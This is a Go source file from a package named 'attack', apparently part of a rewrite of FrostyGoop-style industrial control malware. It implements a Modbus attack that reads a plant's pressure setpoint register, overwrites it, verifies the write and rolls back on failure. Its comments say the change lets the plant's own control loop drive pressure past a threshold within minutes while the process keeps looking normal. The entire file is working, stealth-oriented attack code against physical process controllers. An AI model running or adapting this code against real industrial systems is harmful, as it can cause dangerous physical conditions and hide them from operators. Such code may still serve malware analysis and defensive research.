package attack

import (
	"errors"
	"fmt"

	"github.com/abb00717/frostygoop-rewrite/internal/modbus"
)

type setpointClient interface {
	ReadHolding(addr, count uint16) ([]uint16, error)
	WriteSingle(addr, value uint16) error
}

// PressureSetpoint moves pressure_sp and lets the plant's own control loop
// raise the pressure. This is the only path the original sample could have
// taken here, since it reaches the goal with FC03/FC06 alone and never touches
// manual_mode, leaving the process looking normal throughout.
//
// Sequence: read the current value and keep it, write the new one, read back,
// restore the saved value on failure. Measured climb is roughly 35 raw units
// per second, so it takes three to four minutes to cross the threshold.
func PressureSetpoint(c *modbus.Conn, value uint16) (*Result, error) {
	return pressureSetpoint(c, value)
}

func pressureSetpoint(c setpointClient, value uint16) (*Result, error) {
	if c == nil {
		return nil, errors.New("nil modbus connection")
	}

	res := &Result{Steps: make([]Step, 0, 4)}
	original := uint16(0)
	hasOriginal := false
	wroteNew := false

	rollback := func() error {
		if !hasOriginal {
			return nil
		}
		step := Step{Name: "rollback pressure_sp", FC: 0x06, Addr: HRPressureSP, Value: []uint16{original}}
		err := c.WriteSingle(HRPressureSP, original)
		if err != nil {
			step.Err = err.Error()
			res.Steps = append(res.Steps, step)
			return err
		}
		res.RolledBack = true
		res.Steps = append(res.Steps, step)
		return nil
	}

	readback, err := c.ReadHolding(HRPressureSP, 1)
	step := Step{Name: "read original pressure_sp", FC: 0x03, Addr: HRPressureSP}
	if err != nil {
		step.Err = err.Error()
		res.Steps = append(res.Steps, step)
		return res, fmt.Errorf("read original pressure_sp: %w", err)
	}
	if len(readback) < 1 {
		step.Err = "empty register response"
		res.Steps = append(res.Steps, step)
		return res, errors.New("read original pressure_sp: empty register response")
	}
	original = readback[0]
	hasOriginal = true
	step.Value = []uint16{original}
	res.Steps = append(res.Steps, step)

	step = Step{Name: "write pressure_sp", FC: 0x06, Addr: HRPressureSP, Value: []uint16{value}}
	err = c.WriteSingle(HRPressureSP, value)
	if err != nil {
		step.Err = err.Error()
		res.Steps = append(res.Steps, step)
		return res, fmt.Errorf("write pressure_sp: %w", err)
	}
	wroteNew = true
	res.Steps = append(res.Steps, step)

	verify, err := c.ReadHolding(HRPressureSP, 1)
	step = Step{Name: "verify pressure_sp", FC: 0x03, Addr: HRPressureSP}
	if err != nil {
		step.Err = err.Error()
		res.Steps = append(res.Steps, step)
		rbErr := rollback()
		if rbErr != nil {
			return res, fmt.Errorf("verify pressure_sp: %w (rollback failed: %v)", err, rbErr)
		}
		return res, fmt.Errorf("verify pressure_sp: %w", err)
	}
	if len(verify) < 1 {
		step.Err = "empty register response"
		res.Steps = append(res.Steps, step)
		rbErr := rollback()
		if rbErr != nil {
			return res, fmt.Errorf("verify pressure_sp: empty response (rollback failed: %v)", rbErr)
		}
		return res, errors.New("verify pressure_sp: empty register response")
	}
	step.Value = []uint16{verify[0]}
	if verify[0] != value {
		step.Err = fmt.Sprintf("readback mismatch want=%d got=%d", value, verify[0])
		res.Steps = append(res.Steps, step)
		rbErr := rollback()
		if rbErr != nil {
			return res, fmt.Errorf("verify pressure_sp mismatch (rollback failed: %v)", rbErr)
		}
		return res, errors.New("verify pressure_sp mismatch")
	}
	res.Steps = append(res.Steps, step)

	if wroteNew {
		res.Success = true
	}
	return res, nil
}
